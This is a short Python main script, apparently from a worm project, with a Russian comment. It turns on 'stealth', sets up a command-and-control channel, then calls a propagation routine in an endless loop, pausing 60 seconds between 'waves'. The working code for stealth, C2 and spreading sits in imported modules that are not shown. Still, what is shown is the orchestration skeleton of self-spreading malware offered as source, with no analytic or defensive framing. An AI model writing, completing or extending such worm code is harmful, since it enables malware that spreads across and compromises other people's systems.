import time
from worm.propagation import propagate
from stealth.stealth import enable_stealth
from comms.comms import establish_c2

def main():
    enable_stealth()
    establish_c2()
    while True:
        propagate()
        time.sleep(60)  # Пауза между волнами

if __name__ == "__main__":
    main()
